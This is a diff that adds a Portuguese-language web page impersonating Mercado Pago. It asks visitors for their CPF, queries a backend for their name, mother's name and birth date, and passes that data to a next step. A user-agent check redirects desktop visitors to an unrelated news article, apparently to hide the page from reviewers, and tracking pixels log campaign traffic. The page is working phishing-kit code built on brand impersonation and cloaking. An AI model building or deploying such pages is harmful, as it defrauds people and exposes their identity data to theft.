@@ -1,0 +1,568 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    
+    
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
+    <title>Cadastro - mercado</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+            background: #EEEEEE;
+            min-height: 100vh;
+            color: #333333;
+            position: relative;
+            overflow-x: hidden;
+            display: flex;
+            flex-direction: column;
+        }
+        .bg-decoration {
+            position: fixed;
+            width: 100%;
+            height: 100%;
+            top: 0;
+            left: 0;
+            z-index: -1;
+            opacity: 0.03;
+            pointer-events: none;
+        }
+        .decoration {
+            position: absolute;
+            border-radius: 50%;
+            background: #3483FA;
+        }
+        .decoration1 {
+            width: 300px;
+            height: 300px;
+            top: 10%;
+            right: 5%;
+            animation: float1 20s infinite ease-in-out;
+        }
+        .decoration2 {
+            width: 200px;
+            height: 200px;
+            bottom: 10%;
+            left: 5%;
+            animation: float2 25s infinite ease-in-out;
+        }
+        .decoration3 {
+            width: 150px;
+            height: 150px;
+            top: 50%;
+            left: 50%;
+            animation: float3 30s infinite ease-in-out;
+        }
+        @keyframes float1 {
+            0%, 100% { transform: translate(0, 0) scale(1); }
+            50% { transform: translate(-30px, 30px) scale(1.1); }
+        }
+        @keyframes float2 {
+            0%, 100% { transform: translate(0, 0) scale(1); }
+            50% { transform: translate(30px, -30px) scale(0.9); }
+        }
+        @keyframes float3 {
+            0%, 100% { transform: translate(-50%, -50%) rotate(0deg); }
+            50% { transform: translate(-50%, -50%) rotate(180deg); }
+        }
+        .header {
+            background: #FFE600;
+            padding: 20px 24px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            animation: slideDown 0.6s ease-out;
+            position: relative;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        @keyframes slideDown {
+            from { transform: translateY(-100%); opacity: 0; }
+            to { transform: translateY(0); opacity: 1; }
+        }
+        .logo-container {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            animation: logoAppear 0.8s ease-out;
+        }
+        .logo-container img {
+            height: 50px;
+            width: auto;
+        }
+        @keyframes logoAppear {
+            from { transform: scale(0.8); opacity: 0; }
+            to { transform: scale(1); opacity: 1; }
+        }
+        .content-container {
+            max-width: 520px;
+            margin: 30px auto;
+            padding: 40px 30px;
+            background: white;
+            border-radius: 8px;
+            box-shadow: 0 1px 2px rgba(0, 0, 0, 0.1);
+            animation: scaleIn 0.6s ease-out;
+            position: relative;
+        }
+        @keyframes scaleIn {
+            from { transform: scale(0.9); opacity: 0; }
+            to { transform: scale(1); opacity: 1; }
+        }
+        .title-section {
+            margin-bottom: 40px;
+        }
+        .main-title {
+            font-size: 22px;
+            font-weight: 600;
+            color: #333333;
+            line-height: 1.3;
+            margin-bottom: 30px;
+            animation: fadeInUp 0.6s ease-out;
+        }
+        @keyframes fadeInUp {
+            from { transform: translateY(20px); opacity: 0; }
+            to { transform: translateY(0); opacity: 1; }
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+        .form-section {
+            margin-bottom: 40px;
+            animation: fadeIn 0.8s ease-out 0.3s both;
+        }
+        .form-group {
+            margin-bottom: 20px;
+        }
+        .form-label {
+            display: block;
+            font-size: 14px;
+            font-weight: 500;
+            color: #666666;
+            margin-bottom: 8px;
+        }
+        .form-input {
+            width: 100%;
+            padding: 16px 20px;
+            border: 1px solid #EDEDED;
+            border-radius: 6px;
+            font-size: 16px;
+            font-family: 'Inter', sans-serif;
+            color: #333333;
+            background: white;
+            transition: all 0.3s ease;
+            outline: none;
+        }
+        .form-input:focus {
+            border-color: #3483FA;
+            box-shadow: 0 0 0 3px rgba(52, 131, 250, 0.15);
+        }
+        .form-input::placeholder {
+            color: #999999;
+            font-weight: 400;
+        }
+        .button {
+            background: #3483FA;
+            color: #FFFFFF;
+            padding: 18px 45px;
+            border-radius: 6px;
+            text-decoration: none;
+            display: block;
+            font-weight: 600;
+            font-size: 16px;
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 15px rgba(52, 131, 250, 0.3);
+            position: relative;
+            overflow: hidden;
+            text-align: center;
+            border: none;
+            cursor: pointer;
+            width: 100%;
+            font-family: 'Inter', sans-serif;
+            animation: fadeIn 0.8s ease-out 0.5s both;
+        }
+        .button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(52, 131, 250, 0.4);
+            background: #2968C8;
+        }
+        .button:active {
+            transform: translateY(0);
+        }
+        .button:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+            transform: none;
+        }
+        .loading-spinner {
+            width: 40px;
+            height: 40px;
+            border: 4px solid #3483FA;
+            border-top: 4px solid transparent;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 20px;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .success-icon {
+            width: 60px;
+            height: 60px;
+            background: #00A650;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 20px;
+            animation: successPop 0.6s ease-out;
+        }
+        .success-icon::after {
+            content: '✓';
+            color: white;
+            font-size: 30px;
+            font-weight: bold;
+        }
+        @keyframes successPop {
+            0% { transform: scale(0); }
+            50% { transform: scale(1.1); }
+            100% { transform: scale(1); }
+        }
+        .success-message {
+            color: #00A650;
+            font-size: 18px;
+            font-weight: 600;
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        .user-data {
+            margin-bottom: 30px;
+        }
+        .user-data-item {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 15px 0;
+            border-bottom: 1px solid #EDEDED;
+        }
+        .user-data-item:last-child {
+            border-bottom: none;
+        }
+        .user-data-label {
+            font-weight: 600;
+            color: #333333;
+        }
+        .user-data-value {
+            color: #666666;
+            font-weight: 500;
+        }
+        .hidden {
+            display: none;
+        }
+        footer {
+            padding: 20px;
+            text-align: center;
+            background: #FFFFFF;
+            border-top: 1px solid #EDEDED;
+            margin-top: auto;
+        }
+        footer p {
+            color: #999999;
+            font-size: 12px;
+            margin: 2px 0;
+            line-height: 1.5;
+        }
+        footer a {
+            color: #3483FA;
+            text-decoration: none;
+        }
+        footer a:hover {
+            text-decoration: underline;
+        }
+        @media (max-width: 500px) {
+            .content-container {
+                margin: 20px 15px;
+                padding: 30px 20px;
+            }
+            .main-title {
+                font-size: 20px;
+            }
+            .header {
+                padding: 18px 20px;
+            }
+            .logo-container img {
+                height: 40px;
+            }
+            .button {
+                padding: 16px 35px;
+                font-size: 16px;
+            }
+            .form-input {
+                padding: 14px 16px;
+                font-size: 16px;
+            }
+        }
+    </style>
+
+    <!-- Pixel Facebook 1 -->
+    <script>
+        window.pixelId = "6a184246f1f2699f88b3ab4b";
+        var a = document.createElement("script");
+        a.setAttribute("async", "");
+        a.setAttribute("defer", "");
+        a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+        document.head.appendChild(a);
+    </script>
+
+    <!-- Pixel Facebook 2 -->
+    <script>
+        window.pixelId = "699511958e254c5ebc775636";
+        var a = document.createElement("script");
+        a.setAttribute("async", "");
+        a.setAttribute("defer", "");
+        a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+        document.head.appendChild(a);
+    </script>
+
+    <!-- Pixel UTMify -->
+    <script src="https://cdn.utmify.com.br/scripts/utms/latest.js" data-utmify-prevent-xcod-sck
+        data-utmify-prevent-subids async defer></script>
+
+    <!-- Pixel Google (adicionado sem interferir nos pixels existentes) -->
+    <script>
+        window.googlePixelId = "6a1ecf677f95f02e48c8cff3";
+        var a = document.createElement("script");
+        a.setAttribute("async", "");
+        a.setAttribute("defer", "");
+        a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel-google.js");
+        document.head.appendChild(a);
+    </script>
+
+    <script type="text/javascript">
+        if (!/iPhone|iPod|iPad|Android|BlackBerry|IEMobile/i.test(navigator.userAgent) && window.innerWidth > 768) {
+            window.location.replace('https://mundologistica.com.br/noticias/shopee-amplia-entregas-com-mais-de-2-mil-pontos-de-retirada');
+        }
+    </script>
+</head>
+<body>
+    <div class="bg-decoration">
+        <div class="decoration decoration1"></div>
+        <div class="decoration decoration2"></div>
+        <div class="decoration decoration3"></div>
+    </div>
+    <div class="header">
+        <!-- Logo mercado -->
+        <div class="logo-container">
+            <img src="https://i.postimg.cc/jS6Z8kTp/logo.png" alt="mercado">
+        </div>
+    </div>
+    <div class="content-container">
+        <div id="form-screen">
+            <div class="title-section">
+                <h1 class="main-title">Preencha seus dados para cadastro</h1>
+            </div>
+            <div class="form-section">
+                <div class="form-group">
+                    <label class="form-label" for="cpf">CPF</label>
+                    <input
+                        type="tel"
+                        id="cpf"
+                        class="form-input"
+                        placeholder="000.000.000-00"
+                        maxlength="14"
+                        inputmode="numeric"
+                        pattern="[0-9]*"
+                    >
+                </div>
+            </div>
+            <button class="button" id="continuar-btn">Continuar</button>
+        </div>
+
+        <div id="loading-screen" class="hidden">
+            <div class="title-section">
+                <div class="loading-spinner"></div>
+                <h1 class="main-title" style="text-align: center;">Estamos procurando seus dados</h1>
+            </div>
+        </div>
+
+        <div id="success-screen" class="hidden">
+            <div class="title-section" style="text-align: center;">
+                <div class="success-icon"></div>
+                <div class="success-message">Dados encontrados com sucesso!</div>
+            </div>
+            <div class="user-data">
+                <div class="user-data-item">
+                    <span class="user-data-label">Nome:</span>
+                    <span class="user-data-value" id="user-name">-</span>
+                </div>
+                <div class="user-data-item">
+                    <span class="user-data-label">Data de Nascimento:</span>
+                    <span class="user-data-value" id="user-birth">-</span>
+                </div>
+            </div>
+            <button class="button" id="continuar-final">Continuar</button>
+        </div>
+    </div>
+
+    <footer>
+        <p>© 2025 Mercado Instituição de Pagamento Ltda.</p>
+        <p>CNPJ: 10.573.521/0001-91 · <a href="#">Termos e condições</a> · <a href="#">Privacidade</a></p>
+    </footer>
+
+    <script>
+        // =======================================================
+        // SISTEMA DE PASSAGEM DE PARÂMETROS URL
+        // =======================================================
+        
+        function getUrlParams() {
+            const params = {};
+            const urlParams = new URLSearchParams(window.location.search);
+            for (const [key, value] of urlParams) {
+                params[key] = value;
+            }
+            return params;
+        }
+
+        function buildUrlWithParams(baseUrl, additionalParams = {}) {
+            const params = getUrlParams();
+            const url = new URL(baseUrl, window.location.href);
+            Object.keys(params).forEach(key => url.searchParams.append(key, params[key]));
+            Object.keys(additionalParams).forEach(key => {
+                if (additionalParams[key]) url.searchParams.append(key, additionalParams[key]);
+            });
+            return url.toString();
+        }
+
+        console.log('Parâmetros recebidos na página de cadastro:', getUrlParams());
+
+        // =======================================================
+        // SISTEMA DE DADOS DO USUÁRIO
+        // =======================================================
+
+        const UserData = {
+            save: (dados) => sessionStorage.setItem('user_data', JSON.stringify(dados)),
+            load: () => JSON.parse(sessionStorage.getItem('user_data')) || null,
+            update: function(novosDados) {
+                const dados = { ...(this.load() || {}), ...novosDados };
+                this.save(dados);
+                return dados;
+            },
+            clear: () => sessionStorage.removeItem('user_data')
+        };
+
+        let currentUserData = {};
+
+        // =======================================================
+        // MÁSCARA DO CPF
+        // =======================================================
+        
+        document.getElementById('cpf').addEventListener('input', function(e) {
+            let v = e.target.value.replace(/\D/g, '');
+            if (v.length <= 11) {
+                v = v.replace(/(\d{3})(\d)/, '$1.$2');
+                v = v.replace(/(\d{3})(\d)/, '$1.$2');
+                v = v.replace(/(\d{3})(\d{1,2})$/, '$1-$2');
+                e.target.value = v;
+            }
+        });
+
+        // =======================================================
+        // CONSULTA CPF - CHAMANDO O BACKEND PHP
+        // =======================================================
+        
+        async function consultarCPF(cpf) {
+            const cpfLimpo = cpf.replace(/\D/g, '');
+            
+            // CHAMA SEU BACKEND PHP AO INVÉS DA API DIRETO
+            const url = `/api/getCpf.php?cpf=${cpfLimpo}`;
+            
+            try {
+                const response = await fetch(url);
+                const data = await response.json();
+                
+                // Verifica se o PHP retornou sucesso
+                if (!data.success) {
+                    throw new Error(data.erro || 'CPF não encontrado');
+                }
+                
+                // Retorna os dados no formato que o site espera
+                return {
+                    nome: data.nome || '',
+                    nomeMae: data.mae || '',
+                    nascimento: data.nascimento || '',
+                    sexo: data.sexo || ''
+                };
+            } catch (error) {
+                console.error('Erro na consulta:', error);
+                throw new Error('Não foi possível consultar o CPF no momento');
+            }
+        }
+
+        // =======================================================
+        // EVENTO DO BOTÃO CONTINUAR (VALIDAR CPF)
+        // =======================================================
+        
+        document.getElementById('continuar-btn').addEventListener('click', async function() {
+            const cpf = document.getElementById('cpf').value;
+            const cpfLimpo = cpf.replace(/\D/g, '');
+            if (cpfLimpo.length !== 11) return alert('CPF inválido. Verifique e tente novamente.');
+
+            const btn = document.getElementById('continuar-btn');
+            btn.disabled = true;
+            btn.textContent = 'Validando...';
+
+            document.getElementById('form-screen').classList.add('hidden');
+            document.getElementById('loading-screen').classList.remove('hidden');
+
+            try {
+                const userData = await consultarCPF(cpf);
+                currentUserData = {
+                    cpf: cpf,
+                    cpf_limpo: cpfLimpo,
+                    nome: userData.nome,
+                    data_nascimento: userData.nascimento
+                };
+
+                document.getElementById('loading-screen').classList.add('hidden');
+                document.getElementById('success-screen').classList.remove('hidden');
+                document.getElementById('user-name').textContent = userData.nome;
+                document.getElementById('user-birth').textContent = userData.nascimento;
+
+                UserData.update({ ...currentUserData, etapa: 'dados_cadastrados' });
+                console.log('Dados do usuário salvos:', currentUserData);
+            } catch (e) {
+                document.getElementById('loading-screen').classList.add('hidden');
+                document.getElementById('form-screen').classList.remove('hidden');
+                btn.disabled = false;
+                btn.textContent = 'Continuar';
+                alert(e.message || 'CPF não encontrado. Verifique e tente novamente.');
+            }
+        });
+
+        // =======================================================
+        // EVENTO DO BOTÃO FINAL - REDIRECIONA PRESERVANDO PARÂMETROS
+        // =======================================================
+        
+        document.getElementById('continuar-final').addEventListener('click', function() {
+            const paramsToSend = {
+                cpf: currentUserData.cpf_limpo,
+                nome: currentUserData.nome,
+                data_nascimento: currentUserData.data_nascimento
+            };
+            
+            const nextUrl = buildUrlWithParams('2.html', paramsToSend);
+            console.log('Redirecionando para:', nextUrl);
+            console.log('Parâmetros preservados:', getUrlParams());
+            console.log('Novos parâmetros adicionados:', paramsToSend);
+            
+            window.location.href = nextUrl;
+        });
+    </script>
+</body>
+</html>
